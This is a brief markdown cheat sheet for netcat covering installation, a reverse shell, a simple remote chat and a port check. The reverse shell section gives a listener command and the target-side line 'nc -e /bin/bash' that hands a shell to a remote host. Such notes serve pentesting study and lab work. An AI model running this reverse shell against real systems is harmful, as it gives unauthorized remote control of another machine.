# Netcat (nc)
```shell
sudo apt install netcat
```
## Reverse shell
- Source
```shell
nc -nvl -s <source_ip> -p <source_port>
```
> If you add -e here you can execute commands from target to source also

- Target
```shell
nc -e /bin/bash <source_ip> <source_port>
```

## Remote Chat
- Source
```shell
nc -nvl -p <source_port>
```
> If you add -e here you can execute commands from target to source also

- Target
```shell
nc <source_ip> <source_port>
```


## Check if port is open
```shell
nc -nv <target> 22
```